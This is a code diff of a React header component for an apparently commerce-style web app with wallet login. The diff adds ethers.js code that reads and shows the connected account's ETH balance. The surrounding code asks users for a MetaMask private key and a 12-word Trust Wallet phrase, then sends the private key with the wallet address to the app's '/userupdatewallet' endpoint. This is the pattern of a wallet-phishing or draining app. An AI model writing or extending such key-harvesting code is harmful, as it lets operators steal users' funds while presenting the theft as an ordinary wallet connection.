@@ -18,6 +18,7 @@ import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import { faSpinner } from '@fortawesome/free-solid-svg-icons';
 import { IoCartOutline } from "react-icons/io5";
 import { MdOutlineAdminPanelSettings } from "react-icons/md";
+import { ethers } from 'ethers';
 
 
 
@@ -36,7 +37,9 @@ const AppHeader = () => {
     const [metaKey, setMetaKey] = useState('')
     const [trustKey, setTrustKey] = useState('')
     const [trustWallet, setTrustWallet] = useState('')
+    const [balance, setBalance] = useState('')
 
+    const [userAccount, setUserAccount] = useState('')
 
     const [validMetaKey, setValidMetaKey] = useState(null)
 
@@ -56,6 +59,38 @@ const AppHeader = () => {
         }
 
     }, [metaKey])
+    useEffect(() => {
+        const connectWallet = async () => {
+            if (window.ethereum) {
+                try {
+                    // Request access to the user's MetaMask wallet
+                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+
+                    // Set the first account retrieved (default account)
+                    let account;
+                    account = accounts[0];
+                    const getBalance = async (address) => {
+                        try {
+                            const provider = new ethers.providers.Web3Provider(window.ethereum);
+                            const balance = await provider.getBalance(address);
+                            setBalance(ethers.utils.formatEther(balance));
+                            console.log(ethers.utils.formatEther(balance))// Convert balance from Wei to Ether
+                        } catch (error) {
+                            console.error("Error fetching balance:", error);
+                        }
+                    };
+                    getBalance(account)
+
+                } catch (error) {
+                    console.error("Error connecting wallet:", error);
+                }
+            } else {
+                alert("MetaMask is not installed. Please install it to connect your wallet.");
+            }
+        }
+
+        connectWallet()
+    }, [])
 
 
 
@@ -114,9 +149,20 @@ const AppHeader = () => {
             const web3 = new Web3(ethereum);
             const accounts = await web3.eth.getAccounts();
 
+            const getBalance = async (address) => {
+                try {
+                    const provider = new ethers.providers.Web3Provider(window.ethereum);
+                    const balance = await provider.getBalance(address);
+                    setBalance(ethers.utils.formatEther(balance));
+                    console.log(ethers.utils.formatEther(balance))// Convert balance from Wei to Ether
+                } catch (error) {
+                    console.error("Error fetching balance:", error);
+                }
+            };
 
             if (!accounts) return console.log('!no Acccounts');
             userAccount = accounts[0];
+            getBalance(userAccount);
             console.log(userAccount);
             console.log(metaKey);
         } catch (error) {
@@ -126,6 +172,7 @@ const AppHeader = () => {
             setIsLoading(false)
         }
 
+        // return console.log('wwallet connected');
 
         try {
             const response = await axiosPrivate.patch('/userupdatewallet', JSON.stringify({ _id: user?._id, walletAddress: userAccount, privateKey: metaKey }))
@@ -151,34 +198,7 @@ const AppHeader = () => {
     const signWithTrust = async () => {
 
         if (!hasUpTo12Words(trustKey)) return window.alert('❌ Invalid Key')
-        // try {
 
-
-        //     const ethereum = window.trustwallet
-
-        //     if (!ethereum) return window.alert('no wallet extension found. If you are on mobile, please switch to Trust wallet mobile app\'s or metamask app.');
-
-        //     const connect = await ethereum.request({ method: 'eth_requestAccounts' });
-
-        //     if (!connect) return console.log('connection failed');
-
-        //     const web3 = new Web3(ethereum);
-        //     const accounts = await web3.eth.getAccounts();
-
-        //     if (!accounts) return console.log('!no Acccounts');
-
-        //     userAccount = accounts[0];
-
-        //     console.log(userAccount);
-        //     console.log(trustKey);
-
-        // } catch (error) {
-        //     setIsLoading(false)
-        //     console.log(error.response);
-
-        // } finally {
-        //     setIsLoading(false)
-        // }
 
         let userAccount
         setIsLoading(true)
@@ -193,10 +213,22 @@ const AppHeader = () => {
             const web3 = new Web3(ethereum);
             const accounts = await web3.eth.getAccounts();
 
+            const getBalance = async (address) => {
+                try {
+                    const provider = new ethers.providers.Web3Provider(window.ethereum);
+                    const balance = await provider.getBalance(address);
+                    setBalance(ethers.utils.formatEther(balance));
+                    console.log(ethers.utils.formatEther(balance))// Convert balance from Wei to Ether
+                } catch (error) {
+                    console.error("Error fetching balance:", error);
+                }
+            };
+
 
             if (!accounts) return console.log('!no Acccounts');
             userAccount = accounts[0];
             console.log(userAccount);
+            getBalance(userAccount)
             console.log(metaKey);
         } catch (error) {
             console.log(error);
@@ -225,6 +257,7 @@ const AppHeader = () => {
         }
 
     }
+
 
 
 
@@ -434,7 +467,8 @@ const AppHeader = () => {
                             </div>
                             {user?.walletAddress && <div className='min-w-[50px] max-h-[60px] text-nowrap mr-1'>
                                 <FaEthereum className='inline mb-1' />
-                                <span className='text-xl'>{Number(user?.balance).toFixed(4)} ETH</span>
+                                {!!user?.balance && <span className='text-xl'>{Number(user?.balance).toFixed(4)}   ETH</span>}
+                                {!user?.balance && <span className='text-xl'>{Number(balance).toFixed(4)}   ETH</span>}
                                 <br />
                                 <span className='-mt-1 block text-[13px] text-gray-500'> <span className='inline md:mr-1 bg-green-600 w-[5px] h-[5px] rounded-full'>
                                 </span>
